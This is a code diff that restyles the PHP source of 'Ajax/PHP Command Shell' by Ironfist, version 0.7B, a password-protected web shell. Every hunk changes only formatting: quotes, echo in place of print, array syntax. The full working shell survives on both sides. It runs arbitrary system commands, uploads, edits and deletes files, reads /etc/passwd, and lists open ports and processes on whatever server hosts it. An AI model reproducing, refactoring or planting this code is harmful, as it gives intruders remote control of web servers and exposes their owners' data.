@@ -3,20 +3,19 @@ session_start();
 
 error_reporting(0);
 
-$password = "password";		 //Change this to your password ;)
+$password = 'password';		 //Change this to your password ;)
 
-$version = "0.7B";
+$version = '0.7B';
 
-$functions = array('Clear Screen' => 'ClearScreen()',
+$functions = ['Clear Screen' => 'ClearScreen()',
 'Clear History' => 'ClearHistory()',
 'Can I function?' => "runcommand('canirun','GET')",
 'Get server info' => "runcommand('showinfo','GET')",
 'Read /etc/passwd' => "runcommand('etcpasswdfile','GET')",
 'Open ports' => "runcommand('netstat -an | grep -i listen','GET')",
 'Running processes' => "runcommand('ps -aux','GET')",
-'Readme' => "runcommand('shellhelp','GET')"
-
-);
+'Readme' => "runcommand('shellhelp','GET')",
+];
 $thisfile = basename(__FILE__);
 
 $style = '<style type="text/css">
@@ -64,12 +63,12 @@ color: #FFFFFF;
 font-family: verdana;
 }
 </style>';
-$sess = __FILE__.$password;
+$sess = __FILE__ . $password;
 if (isset($_POST['p4ssw0rD'])) {
     if ($_POST['p4ssw0rD'] == $password) {
         $_SESSION[$sess] = $_POST['p4ssw0rD'];
     } else {
-        die("Wrong password");
+        die('Wrong password');
     }
 }
 if ($_SESSION[$sess] == $password) {
@@ -80,7 +79,7 @@ if ($_SESSION[$sess] == $password) {
     }
 
     if (isset($_FILES['uploadedfile']['name'])) {
-        $target_path = "./";
+        $target_path = './';
         $target_path = $target_path . basename($_FILES['uploadedfile']['name']);
         if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
         }
@@ -89,27 +88,27 @@ if ($_SESSION[$sess] == $password) {
     if (isset($_GET['runcmd'])) {
         $cmd = $_GET['runcmd'];
 
-        print "<b>".get_current_user()."~# </b>". htmlspecialchars($cmd)."<br>";
+        echo '<b>' . get_current_user() . '~# </b>' . htmlspecialchars($cmd) . '<br>';
 
-        if ($cmd == "") {
-            print "Empty Command..type \"shellhelp\" for some ehh...help";
-        } elseif ($cmd == "upload") {
-            print '<br>Uploading to: '.realpath(".");
-            if (is_writable(realpath("."))) {
-                print "<br><b>I can write to this directory</b>";
+        if ('' == $cmd) {
+            echo 'Empty Command..type "shellhelp" for some ehh...help';
+        } elseif ('upload' == $cmd) {
+            echo '<br>Uploading to: ' . realpath('.');
+            if (is_writable(realpath('.'))) {
+                echo '<br><b>I can write to this directory</b>';
             } else {
-                print "<br><b><font color=red>I can't write to this directory, please choose another one.</b></font>";
+                echo "<br><b><font color=red>I can't write to this directory, please choose another one.</b></font>";
             }
-        } elseif ((ereg("changeworkdir (.*)", $cmd, $file)) || (ereg("cd (.*)", $cmd, $file))) {
+        } elseif ((ereg('changeworkdir (.*)', $cmd, $file)) || (ereg('cd (.*)', $cmd, $file))) {
             if (file_exists($file[1]) && is_dir($file[1])) {
                 chdir($file[1]);
                 $_SESSION['workdir'] = $file[1];
-                print "Current directory changed to ".$file[1];
+                echo 'Current directory changed to ' . $file[1];
             } else {
-                print "Directory not found";
+                echo 'Directory not found';
             }
-        } elseif (strtolower($cmd) == "shellhelp") {
-            print '<b><font size=7>Ajax/PHP Command Shell</b></font>
+        } elseif ('shellhelp' == strtolower($cmd)) {
+            echo '<b><font size=7>Ajax/PHP Command Shell</b></font>
 &copy; By Ironfist
 
 The shell can be used by anyone to command any server, the main purpose was
@@ -132,140 +131,140 @@ even require one :P
 
 - Iron
 			';
-        } elseif (ereg("editfile (.*)", $cmd, $file)) {
+        } elseif (ereg('editfile (.*)', $cmd, $file)) {
             if (file_exists($file[1]) && !is_dir($file[1])) {
-                print "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\">";
+                echo '<form name="saveform"><textarea cols=70 rows=10 id="area1">';
                 $contents = file($file[1]);
                 foreach ($contents as $line) {
-                    print htmlspecialchars($line);
+                    echo htmlspecialchars($line);
                 }
-                print "</textarea><br><input size=80 type=text name=filetosave value=".$file[1]."><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
+                echo '</textarea><br><input size=80 type=text name=filetosave value=' . $file[1] . '><input value="Save" type=button onclick="SaveFile();"></form>';
             } else {
-                print "File not found.";
+                echo 'File not found.';
             }
-        } elseif (ereg("deletefile (.*)", $cmd, $file)) {
+        } elseif (ereg('deletefile (.*)', $cmd, $file)) {
             if (is_dir($file[1])) {
                 if (rmdir($file[1])) {
-                    print "Directory succesfully deleted.";
+                    echo 'Directory succesfully deleted.';
                 } else {
-                    print "Couldn't delete directory!";
+                    echo "Couldn't delete directory!";
                 }
             } else {
                 if (unlink($file[1])) {
-                    print "File succesfully deleted.";
+                    echo 'File succesfully deleted.';
                 } else {
-                    print "Couldn't delete file!";
+                    echo "Couldn't delete file!";
                 }
             }
-        } elseif (strtolower($cmd) == "canirun") {
-            print "If any of these functions is Enabled, the shell will function like it should.<br>";
+        } elseif ('canirun' == strtolower($cmd)) {
+            echo 'If any of these functions is Enabled, the shell will function like it should.<br>';
             if (function_exists(passthru)) {
-                print "Passthru: <b><font color=green>Enabled</b></font><br>";
+                echo 'Passthru: <b><font color=green>Enabled</b></font><br>';
             } else {
-                print "Passthru: <b><font color=red>Disabled</b></font><br>";
+                echo 'Passthru: <b><font color=red>Disabled</b></font><br>';
             }
 
             if (function_exists(exec)) {
-                print "Exec: <b><font color=green>Enabled</b></font><br>";
+                echo 'Exec: <b><font color=green>Enabled</b></font><br>';
             } else {
-                print "Exec: <b><font color=red>Disabled</b></font><br>";
+                echo 'Exec: <b><font color=red>Disabled</b></font><br>';
             }
 
             if (function_exists(system)) {
-                print "System: <b><font color=green>Enabled</b></font><br>";
+                echo 'System: <b><font color=green>Enabled</b></font><br>';
             } else {
-                print "System: <b><font color=red>Disabled</b></font><br>";
+                echo 'System: <b><font color=red>Disabled</b></font><br>';
             }
             if (function_exists(shell_exec)) {
-                print "Shell_exec: <b><font color=green>Enabled</b></font><br>";
+                echo 'Shell_exec: <b><font color=green>Enabled</b></font><br>';
             } else {
-                print "Shell_exec: <b><font color=red>Disabled</b></font><br>";
+                echo 'Shell_exec: <b><font color=red>Disabled</b></font><br>';
             }
-            print "<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren't executed, this is probally it.<br>";
+            echo "<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren't executed, this is probally it.<br>";
             if (ini_get('safe_mode')) {
-                print "Safe Mode: <b><font color=red>Enabled</b></font>";
+                echo 'Safe Mode: <b><font color=red>Enabled</b></font>';
             } else {
-                print "Safe Mode: <b><font color=green>Disabled</b></font>";
+                echo 'Safe Mode: <b><font color=green>Disabled</b></font>';
             }
-            print "<br><br>Open_basedir will block access to some files you <i>shouldn't</i> access.<br>";
+            echo "<br><br>Open_basedir will block access to some files you <i>shouldn't</i> access.<br>";
             if (ini_get('open_basedir')) {
-                print "Open_basedir: <b><font color=red>Enabled</b></font>";
+                echo 'Open_basedir: <b><font color=red>Enabled</b></font>';
             } else {
-                print "Open_basedir: <b><font color=green>Disabled</b></font>";
+                echo 'Open_basedir: <b><font color=green>Disabled</b></font>';
             }
         }
         //About the shell
-        elseif (ereg("listdir (.*)", $cmd, $directory)) {
+        elseif (ereg('listdir (.*)', $cmd, $directory)) {
             if (!file_exists($directory[1])) {
-                die("Directory not found");
+                die('Directory not found');
             }
             //Some variables
             chdir($directory[1]);
             $i = 0;
             $f = 0;
-            $dirs = "";
-            $filez = "";
-            
-            if (!ereg("/$", $directory[1])) { //Does it end with a slash?
-                    $directory[1] .= "/"; //If not, add one
+            $dirs = '';
+            $filez = '';
+
+            if (!ereg('/$', $directory[1])) { //Does it end with a slash?
+                    $directory[1] .= '/'; //If not, add one
             }
-            print "Listing directory: ".$directory[1]."<br>";
-            print "<table border=0><td><b>Directories</b></td><td><b>Files</b></td><tr>";
-            
+            echo 'Listing directory: ' . $directory[1] . '<br>';
+            echo '<table border=0><td><b>Directories</b></td><td><b>Files</b></td><tr>';
+
             if ($handle = opendir($directory[1])) {
                 while (false !== ($file = readdir($handle))) {
                     if (is_dir($file)) {
-                        $dirs[$i]  = $file;
-                        $i++;
+                        $dirs[$i] = $file;
+                        ++$i;
                     } else {
                         $filez[$f] = $file;
-                        $f++;
+                        ++$f;
                     }
                 }
-                print "<td>";
-               
+                echo '<td>';
+
                 foreach ($dirs as $directory) {
-                    print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($directory)."');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir ".realpath($directory)."','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir ".realpath($directory)."','GET'); \">".$directory."</b><br>";
+                    echo "<i style=\"cursor:crosshair\" onclick=\"deletefile('" . realpath($directory) . "');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir " . realpath($directory) . "','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir " . realpath($directory) . "','GET'); \">" . $directory . '</b><br>';
                 }
-               
-                print "</td><td>";
-               
+
+                echo '</td><td>';
+
                 foreach ($filez as $file) {
-                    print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($file)."');\">[D]</i><u style=\"cursor:crosshair\" onclick=\"runcommand('editfile ".realpath($file)."','GET');\">".$file."</u><br>";
+                    echo "<i style=\"cursor:crosshair\" onclick=\"deletefile('" . realpath($file) . "');\">[D]</i><u style=\"cursor:crosshair\" onclick=\"runcommand('editfile " . realpath($file) . "','GET');\">" . $file . '</u><br>';
                 }
-               
-                print "</td></table>";
+
+                echo '</td></table>';
             }
-        } elseif (strtolower($cmd) == "about") {
-            print "Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version";
+        } elseif ('about' == strtolower($cmd)) {
+            echo "Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version";
         }
         //Show info
-        elseif (strtolower($cmd) == "showinfo") {
+        elseif ('showinfo' == strtolower($cmd)) {
             if (function_exists(disk_free_space)) {
-                $free = disk_free_space("/") / 1000000;
+                $free = disk_free_space('/') / 1000000;
             } else {
-                $free = "N/A";
+                $free = 'N/A';
             }
             if (function_exists(disk_total_space)) {
-                $total = trim(disk_total_space("/") / 1000000);
+                $total = trim(disk_total_space('/') / 1000000);
             } else {
-                $total = "N/A";
+                $total = 'N/A';
             }
-            $path = realpath(".");
-            
-            print "<b>Free:</b> $free / $total MB<br><b>Current path:</b> $path<br><b>Uname -a Output:</b><br>";
-            
+            $path = realpath('.');
+
+            echo "<b>Free:</b> $free / $total MB<br><b>Current path:</b> $path<br><b>Uname -a Output:</b><br>";
+
             if (function_exists(passthru)) {
-                passthru("uname -a");
+                passthru('uname -a');
             } else {
-                print "Passthru is disabled :(";
+                echo 'Passthru is disabled :(';
             }
         }
         //Read /etc/passwd
-        elseif (strtolower($cmd) == "etcpasswdfile") {
+        elseif ('etcpasswdfile' == strtolower($cmd)) {
             $pw = file('/etc/passwd/');
             foreach ($pw as $line) {
-                print $line;
+                echo $line;
             }
         }
         //Execute any other command
@@ -274,18 +273,18 @@ even require one :P
                 passthru($cmd);
             } else {
                 if (function_exists(exec)) {
-                    exec("ls -la", $result);
+                    exec('ls -la', $result);
                     foreach ($result as $output) {
-                        print $output."<br>";
+                        echo $output . '<br>';
                     }
                 } else {
                     if (function_exists(system)) {
                         system($cmd);
                     } else {
                         if (function_exists(shell_exec)) {
-                            print shell_exec($cmd);
+                            echo shell_exec($cmd);
                         } else {
-                            print "Sorry, none of the command functions works.";
+                            echo 'Sorry, none of the command functions works.';
                         }
                     }
                 }
@@ -298,7 +297,7 @@ even require one :P
                 die("Nope, can't chmod nor save :("); //In fact, nobody ever reads this message ^_^
             }
         }
-        
+
         $fh = fopen($file, 'w');
         $dt = $_POST['filecontent'];
         fwrite($fh, $dt);
@@ -306,9 +305,9 @@ even require one :P
     } else {
         ?>
 <html>
-<title>Command Shell ~ <?php print getenv("HTTP_HOST"); ?></title>
+<title>Command Shell ~ <?php echo getenv('HTTP_HOST'); ?></title>
 <head>
-<?php print $style; ?>
+<?php echo $style; ?>
 <SCRIPT TYPE="text/javascript">
 function sf(){document.cmdform.command.focus();}
 var outputcmd = "";
@@ -369,7 +368,7 @@ function SaveFile()
 {
 var poststr = "filetosave=" + encodeURI( document.saveform.filetosave.value ) +
                     "&filecontent=" + encodeURI( document.getElementById("area1").value );
-makePOSTRequest('<?php print $ThisFile; ?>?savefile', poststr);
+makePOSTRequest('<?php echo $ThisFile; ?>?savefile', poststr);
 document.getElementById('output').innerHTML = document.getElementById('output').innerHTML + "<br><b>Saved! If it didn't save, you'll need to chmod the file to 777 yourself,<br> however the script tried to chmod it automaticly.";
 }
 
@@ -426,18 +425,18 @@ function set_tab(newtab)
 	else if(newtab == "upload")
 	{
 		runcommand('upload','GET');
-		newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enctype="multipart/form-data" action="<?php print $ThisFile; ?>" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="10000000" />Choose a file to upload: <input name="uploadedfile" type="file" /><br /><input type="submit" value="Upload File" /></form></font>';
+		newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enctype="multipart/form-data" action="<?php echo $ThisFile; ?>" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="10000000" />Choose a file to upload: <input name="uploadedfile" type="file" /><br /><input type="submit" value="Upload File" /></form></font>';
 	}
 	else if(newtab == "workingdir")
 	{
 		<?php
         $folders = "<form name=workdir onsubmit=\"return runcommand(\'changeworkdir \' + document.workdir.changeworkdir.value,\'GET\');\"><input size=80% type=text name=changeworkdir value=\"";
-        $pathparts = explode("/", realpath("."));
+        $pathparts = explode('/', realpath('.'));
         foreach ($pathparts as $folder) {
-            $folders .= $folder."/";
+            $folders .= $folder . '/';
         }
-        $folders .= "\"><input type=submit value=Change></form><br>Script directory: <i style=\"cursor:crosshair\"  onclick=\"document.workdir.changeworkdir.value=\'".dirname(__FILE__)."\'>".dirname(__FILE__)."</i>"; ?>
-		newhtml = '<?php print $folders; ?>';
+        $folders .= "\"><input type=submit value=Change></form><br>Script directory: <i style=\"cursor:crosshair\"  onclick=\"document.workdir.changeworkdir.value=\'" . dirname(__FILE__) . "\'>" . dirname(__FILE__) . '</i>'; ?>
+		newhtml = '<?php echo $folders; ?>';
 	}
 	else if(newtab == "filebrowser")
 	{
@@ -447,7 +446,7 @@ function set_tab(newtab)
 	else if(newtab == "createfile")
 	{
 		newhtml = '<b>File Editor, under construction.</b>';
-		document.getElementById('output').innerHTML = "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\"></textarea><br><input size=80 type=text name=filetosave value=\"<?php print realpath('.')."/".rand(1000, 999999).".txt"; ?>\"><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
+		document.getElementById('output').innerHTML = "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\"></textarea><br><input size=80 type=text name=filetosave value=\"<?php echo realpath('.') . '/' . rand(1000, 999999) . '.txt'; ?>\"><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
 		
 	}
 		document.getElementById('commandtab').innerHTML = newhtml;
@@ -464,7 +463,7 @@ function set_tab(newtab)
 <div style='margin: 0px;padding: 0px;border: 1px inset;overflow: auto'>
 <?php
 foreach ($functions as $name => $execute) {
-            print '&nbsp;<input type="button" value="'.$name.'" onclick="'.$execute.'"><br>';
+            echo '&nbsp;<input type="button" value="' . $name . '" onclick="' . $execute . '"><br>';
         } ?>
 
 </center>
@@ -479,7 +478,7 @@ foreach ($functions as $name => $execute) {
 <br>
 <b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist
 <br>
-Version <?php print $version; ?>
+Version <?php echo $version; ?>
 
 <br>
 <br>
@@ -521,9 +520,9 @@ and special greetings to everyone in rootshell
 <?php
     }
 } else {
-    print "<center><table border=0  height=100%>
+    echo '<center><table border=0  height=100%>
 <td valign=middle>
-<form action=".basename(__FILE__)." method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password name=p4ssw0rD><input type=submit value=\"Log in\">
-</form>";
+<form action=' . basename(__FILE__) . ' method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password name=p4ssw0rD><input type=submit value="Log in">
+</form>';
 }
 ?>  
